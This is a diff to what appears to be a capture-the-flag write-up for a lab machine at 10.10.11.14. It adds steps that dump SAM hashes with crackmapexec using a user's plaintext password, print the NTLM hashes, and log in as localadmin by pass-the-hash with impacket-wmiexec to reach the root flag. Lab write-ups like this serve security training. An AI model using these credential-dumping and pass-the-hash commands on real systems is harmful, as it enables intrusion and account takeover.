@@ -285,5 +285,24 @@ Get the admin privileges
 
 crackmapexec smb 10.10.11.14 -u maya -p m4y4ngs4ri --sam
 
+![image](https://github.com/zer00d4y/writeups/assets/128820441/4c1a7017-745d-4a4c-8305-30f11589f2fb)
+
+    Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
+    localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
+    maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
+
+Auth using localadmin hash
+
+    impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/4033115f-c2a2-4103-8b2a-c14aa75c741b)
+
+Get the root flag
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/6daf904c-32ed-4991-b1b0-df5c3f97cb08)
+
 
 
